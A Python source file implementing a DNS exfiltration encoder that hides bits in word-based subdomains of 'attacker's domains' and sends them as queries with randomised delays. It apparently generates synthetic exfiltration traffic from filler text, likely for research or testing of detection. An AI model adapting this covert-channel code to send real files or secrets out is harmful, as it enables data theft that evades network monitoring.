import asyncio
from collections import deque
from math import log2

from bitstring import Bits

from tdns.exfil import exfil, SEND_GETHOST


class stealthyvec(exfil):

    idchar = 'b'

    def __init__(self, domains, words, levels, amount, time, method=SEND_GETHOST, resolver_addr=None, random_delay=False):
        '''
        args:
            domains: List of attacker's domains. Preferrably 2^7=128 entries long.
            words: List of meaningful words. Preferrably 2^11=2048 entries long.
            levels: Number of subdomains=words to use to encode data in a single query. Preferrably 3.
        vars:
            D: Number of bits a domain can encode.
            W: Number of bits a single word can encode.
            L: Number of bits a query can transfer. 
        '''
        super().__init__(amount, time, method, resolver_addr, random_delay, prepend=False)
        self.domains = domains
        self.words = words
        self.levels = levels
        self.D = int(log2(len(self.domains)))
        self.W = int(log2(len(self.words)))
        self.L = self.W * levels + self.D
    
    def split_chunk(self, bits):
        '''
        Split bits into query-length(L) chunks.
        '''
        return [bits[i:i+self.L] for i in range(0, len(bits), self.L)]

    def encode_query(self, bits):
        domain_bits, word_bits = bits[:self.D], bits[self.D:]
        word_bits_split = [word_bits[i:i+self.W] for i in range(0, len(word_bits), self.W)]
        words = list(map(lambda bits: self.words[int(bits.bin, 2)], word_bits_split))
        domain = self.domains[int(domain_bits.bin, 2)]
        subdomain = '.'.join(words)
        return f'{subdomain}.{domain}'
    
    async def call__aux(self):
        queue = deque()
        while self.amount > 0:
            if not queue:
                paragraph = self.data.paragraph(nb_sentences=10).encode('ASCII')
                queue.extend(self.split_chunk(Bits(paragraph)))
            query_bits = queue.popleft()
            qname = self.encode_query(query_bits)
            await self.method(qname)
            await asyncio.sleep(self.delay())
            self.amount -= 1
